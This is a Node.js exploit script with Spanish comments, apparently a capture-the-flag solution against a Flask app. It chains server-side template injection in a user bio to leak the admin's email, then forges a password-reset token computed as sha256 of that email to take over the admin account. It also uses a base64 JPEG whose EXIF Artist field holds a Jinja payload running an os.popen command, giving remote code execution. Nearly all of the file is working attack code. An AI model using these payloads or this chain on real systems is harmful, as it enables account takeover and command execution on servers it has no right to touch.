#!/usr/bin/env node

// Modulos nativos: http para las peticiones, crypto para el sha256 del reset
const http   = require("http");
const crypto = require("crypto");


// IP y PORT de la instancia spawneada en la plataforma del CTF
const TARGET = "154.57.164.80";
const PORT   = 31260;

// Para correrlo contra el Docker local, comentar las dos lineas de arriba
// y descomentar estas dos:
// const TARGET = "127.0.0.1";
// const PORT   = 1337;


// Datos de nuestra cuenta de broker "normal" (aleatorios para no chocar)
const rnd  = crypto.randomBytes(3).toString("hex");
const USER = "brk_" + rnd;
const PASS = "Password123";
const MAIL = USER + "@test.com";

// Password nueva que le vamos a poner al admin cuando le robemos la cuenta
const ADMIN_NEW_PASS = "pwned123";


// Imagen JPG con el payload SSTI escondido en el metadato EXIF "Artist".
// Cuando el admin la verifica, el server evalua ese campo como plantilla -> RCE.
// El payload embebido es:
//   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}
const PAYLOAD_JPG_B64 =
  "/9j/4AAQSkZJRgABAQAAAQABAAD/4QCCRXhpZgAATU0AKgAAAAgAAQE7AAIAAABgAAAAGgAAAAB7" +
  "eyBzZWxmLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfXy5fX2ltcG9ydF9fKCdvcycp" +
  "LnBvcGVuKCdjYXQgL2FwcC9mbGFnLnR4dCcpLnJlYWQoKSB9fQD/2wBDAAgGBgcGBQgHBwcJCQgK" +
  "DBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJ" +
  "CQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy" +
  "MjIyMjL/wAARCAAKAAoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL" +
  "/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2Jy" +
  "ggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWG" +
  "h4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo" +
  "6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQD" +
  "BAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRom" +
  "JygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaX" +
  "mJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6" +
  "/9oADAMBAAIRAxEAPwDi6KKK+ZP3E//Z";


// Un mini "cookie jar": guardamos las cookies que nos setea el server
// (sesion de Flask, remember_token) y las reenviamos en cada request
let cookieJar = {};

function cookieHeader() {
  return Object.entries(cookieJar).map(([k, v]) => `${k}=${v}`).join("; ");
}

function storeCookies(res) {
  const set = res.headers["set-cookie"];
  if (!set) return;
  set.forEach((c) => {
    const [pair] = c.split(";");
    const idx = pair.indexOf("=");
    cookieJar[pair.slice(0, idx).trim()] = pair.slice(idx + 1).trim();
  });
}


// Helper generico de peticiones. Devuelve {status, headers, body}
// No sigue redirects: nos interesa el Set-Cookie y el status crudo.
function request(method, path, { body = null, contentType = null } = {}) {
  return new Promise((resolve, reject) => {
    const headers = {};
    if (contentType)          headers["Content-Type"]   = contentType;
    if (body)                 headers["Content-Length"] = Buffer.byteLength(body);
    if (cookieHeader())       headers["Cookie"]         = cookieHeader();

    const req = http.request({ host: TARGET, port: PORT, method, path, headers }, (res) => {
      storeCookies(res);
      let data = [];
      res.on("data", (d) => data.push(d));
      res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(data).toString() }));
    });
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

// Atajo para enviar formularios application/x-www-form-urlencoded
function form(obj) {
  return Object.entries(obj)
    .map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v))
    .join("&");
}

// Construye un cuerpo multipart/form-data para la subida de la imagen
function multipart(fieldName, filename, buffer) {
  const boundary = "----guild" + crypto.randomBytes(8).toString("hex");
  const head =
    `--${boundary}\r\n` +
    `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"\r\n` +
    `Content-Type: image/jpeg\r\n\r\n`;
  const tail = `\r\n--${boundary}--\r\n`;
  const body = Buffer.concat([Buffer.from(head), buffer, Buffer.from(tail)]);
  return { body, contentType: `multipart/form-data; boundary=${boundary}` };
}


async function main() {
  console.log(`[*] Target: http://${TARGET}:${PORT}`);

  // 1) Registrar y loguear un broker normal
  console.log(`[1] Registrando usuario ${USER} ...`);
  await request("POST", "/signup", { body: form({ email: MAIL, username: USER, password: PASS }), contentType: "application/x-www-form-urlencoded" });

  console.log("[2] Login ...");
  await request("POST", "/login", { body: form({ username: USER, password: PASS }), contentType: "application/x-www-form-urlencoded" });

  // 2) Subir la imagen con el payload EXIF.
  // Sirve para dos cosas a la vez: crea la solicitud de verificacion (con eso
  // ya entramos a /profile) y deja subida la imagen que el admin va a verificar.
  console.log("[3] Subiendo imagen con payload EXIF a /verification ...");
  const jpg = Buffer.from(PAYLOAD_JPG_B64, "base64");
  const mp  = multipart("file", "payload.jpg", jpg);
  await request("POST", "/verification", { body: mp.body, contentType: mp.contentType });

  // 3) SSTI en la bio para filtrar el email del admin.
  // La bio se evalua como plantilla al abrir /user/<usuario>. Aprovechamos
  // que el contexto expone User para consultar la base y sacar el mail del admin.
  console.log("[4] Seteando bio con el payload SSTI (leak del email admin) ...");
  const leak = "{{User.query.filter_by(username='admin').first().email}}";
  await request("POST", "/profile", { body: form({ bio: leak }), contentType: "application/x-www-form-urlencoded" });

  console.log("[5] Generando link publico (/getlink) y leyendo /user/" + USER + " ...");
  await request("GET", "/getlink");
  const userPage = await request("GET", "/user/" + USER);
  const m = userPage.body.match(/[0-9a-f]+@master\.guild/);
  if (!m) { console.error("[!] No se pudo leer el email del admin. Body:\n" + userPage.body); return; }
  const adminMail = m[0];
  console.log("    -> email admin: " + adminMail);

  // 4) Reset de contrasena del admin. El token es sha256(email), asi que lo
  // calculamos nosotros mismos con el mail que acabamos de sacar.
  const token = crypto.createHash("sha256").update(adminMail).digest("hex");
  console.log("[6] Token de reset = sha256(email) = " + token);

  console.log("[7] Disparando /forgetpassword para crear el link valido ...");
  await request("POST", "/forgetpassword", { body: form({ email: adminMail }), contentType: "application/x-www-form-urlencoded" });

  console.log("[8] Cambiando la password del admin en /changepasswd/<token> ...");
  await request("POST", "/changepasswd/" + token, { body: form({ password: ADMIN_NEW_PASS }), contentType: "application/x-www-form-urlencoded" });

  // 5) Entrar como admin y verificar la imagen para disparar el RCE.
  console.log("[9] Login como admin ...");
  cookieJar = {}; // arrancamos con la sesion limpia para entrar como admin
  await request("POST", "/login", { body: form({ username: "admin", password: ADMIN_NEW_PASS }), contentType: "application/x-www-form-urlencoded" });

  console.log("[10] Leyendo /admin y verificando cada registro pendiente ...");
  const adminPage = await request("GET", "/admin");
  const ids = [...adminPage.body.matchAll(/name="verification_id"\s+value="(\d+)"/g)].map((x) => x[1]);
  if (ids.length === 0) { console.error("[!] No hay verificaciones pendientes en /admin.\n" + adminPage.body); return; }

  // Al verificar, el server lee el EXIF Artist de la imagen y lo ejecuta como
  // plantilla -> corre nuestro comando y nos devuelve la flag en la respuesta.
  for (const id of ids) {
    const r = await request("POST", "/verify", { body: form({ user_id: "1", verification_id: id }), contentType: "application/x-www-form-urlencoded" });
    const flag = r.body.match(/(HTB|flag)\{[^}]+\}/);
    if (flag) {
      console.log("\n========================================");
      console.log("[+] FLAG: " + flag[0]);
      console.log("========================================");
      return;
    }
  }

  console.error("[!] Ninguna verificacion devolvio flag. Revisar payload/entorno.");
}

main().catch((e) => console.error(e));
